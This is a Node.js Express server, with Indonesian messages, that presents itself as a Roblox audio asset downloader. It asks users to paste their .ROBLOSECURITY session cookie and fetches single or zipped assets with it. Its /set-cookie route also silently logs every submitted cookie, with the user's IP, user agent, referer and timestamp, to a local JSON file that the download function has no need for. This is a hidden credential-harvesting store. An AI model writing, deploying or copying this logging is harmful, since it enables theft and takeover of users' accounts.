const express = require('express');
const cookieSession = require('cookie-session');
const axios = require('axios');
const archiver = require('archiver');
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const DATA_DIR = path.join(__dirname, 'data');
const LOG_FILE = path.join(DATA_DIR, 'cookies_log.json');

async function ensureDataDir() {
    try { await fs.access(DATA_DIR); } catch { await fs.mkdir(DATA_DIR, { recursive: true }); }
}
ensureDataDir();

async function logCookieEntry(entry) {
    try {
        let logs = [];
        try { logs = JSON.parse(await fs.readFile(LOG_FILE, 'utf-8')); } catch { logs = []; }
        if (!Array.isArray(logs)) logs = [];
        logs.push(entry);
        await fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), 'utf-8');
    } catch (err) { console.error('Gagal log:', err.message); }
}

app.set('trust proxy', 1);
app.use(cookieSession({
    name: 'session',
    secret: SESSION_SECRET,
    maxAge: 60 * 60 * 1000,
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax'
}));

app.use(express.json());
app.use(express.static('public'));

// === SET COOKIE + LOG ===
app.post('/set-cookie', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || !cookie.startsWith('_|WARNING')) {
        return res.status(400).json({ error: 'Cookie tidak valid.' });
    }
    req.session.robloxCookie = cookie;
    await logCookieEntry({
        cookie: cookie,
        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        referer: req.headers['referer'] || 'unknown',
        timestamp: new Date().toISOString()
    });
    res.json({ success: true });
});

// === STATUS ===
app.get('/status', (req, res) => {
    res.json({ hasCookie: !!req.session.robloxCookie });
});

// === TEST COOKIE ===
app.get('/test-cookie', async (req, res) => {
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).json({ valid: false, message: 'Belum set cookie.' });

    try {
        const response = await axios({
            method: 'get',
            url: 'https://assetdelivery.roblox.com/v1/asset/?id=9124851790',
            responseType: 'stream',
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
            timeout: 15000,
            validateStatus: status => status < 500
        });
        if (response.status === 200) {
            res.json({ valid: true, message: 'Cookie VALID — bisa akses public asset.' });
        } else {
            res.json({ valid: false, message: `Cookie TIDAK VALID — HTTP ${response.status}` });
        }
    } catch (error) {
        res.json({ valid: false, message: `Error: ${error.message}` });
    }
});

// === LOGOUT ===
app.get('/logout', (req, res) => {
    req.session = null;
    res.redirect('/');
});

// === DOWNLOAD SINGLE ===
app.get('/download/:id', async (req, res) => {
    const id = req.params.id;
    if (!/^\d+$/.test(id)) return res.status(400).send('ID invalid.');
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).send('Belum set cookie.');

    try {
        const response = await axios({
            method: 'get',
            url: `https://assetdelivery.roblox.com/v1/asset/?id=${id}`,
            responseType: 'stream',
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
            timeout: 45000,
            validateStatus: status => status < 500
        });
        if (response.status !== 200) throw new Error(`HTTP ${response.status}`);
        const contentType = response.headers['content-type'] || '';
        let ext = 'ogg';
        if (contentType.includes('mpeg') || contentType.includes('mp3')) ext = 'mp3';
        else if (contentType.includes('wav')) ext = 'wav';

        res.setHeader('Content-Disposition', `attachment; filename="roblox_${id}.${ext}"`);
        res.setHeader('Content-Type', contentType);
        response.data.pipe(res);
    } catch (error) {
        res.status(500).send(`Gagal: ${error.message}`);
    }
});

// === BULK ZIP ===
app.post('/bulk', async (req, res) => {
    const ids = req.body.ids || [];
    if (!Array.isArray(ids) || ids.length === 0) return res.status(400).send('Kirim array ID.');
    const validIds = ids.filter(id => /^\d+$/.test(id));
    if (validIds.length === 0) return res.status(400).send('Tidak ada ID valid.');
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).send('Belum set cookie.');

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="roblox_bulk_${Date.now()}.zip"`);
    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.pipe(res);

    for (const id of validIds) {
        try {
            const response = await axios({
                method: 'get',
                url: `https://assetdelivery.roblox.com/v1/asset/?id=${id}`,
                responseType: 'stream',
                headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
                timeout: 45000,
                validateStatus: status => status < 500
            });
            if (response.status !== 200) throw new Error(`HTTP ${response.status}`);
            const contentType = response.headers['content-type'] || '';
            let ext = 'ogg';
            if (contentType.includes('mpeg') || contentType.includes('mp3')) ext = 'mp3';
            else if (contentType.includes('wav')) ext = 'wav';
            archive.append(response.data, { name: `roblox_${id}.${ext}` });
        } catch (error) {
            archive.append(Buffer.from(`Error: ${error.message}`), { name: `error_${id}.txt` });
        }
    }
    archive.finalize();
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Log file: ${LOG_FILE}`);
});
